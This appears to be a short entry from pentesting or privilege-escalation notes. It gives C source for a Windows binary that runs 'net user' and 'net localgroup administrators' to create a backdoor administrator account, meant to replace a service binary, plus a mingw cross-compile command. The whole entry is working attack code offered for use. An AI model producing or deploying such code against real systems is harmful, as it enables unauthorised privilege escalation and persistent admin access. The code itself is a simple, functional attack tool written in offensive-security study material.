
#### Windows

custom windows binaries.

###### Add User Binary

Windows add user binary - to replace a service binary and add an administrator

```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

`x86_64-w64-mingw32-gcc adduser.c -o adduser.exe` - we can cross-compile our binary for a 64 bit system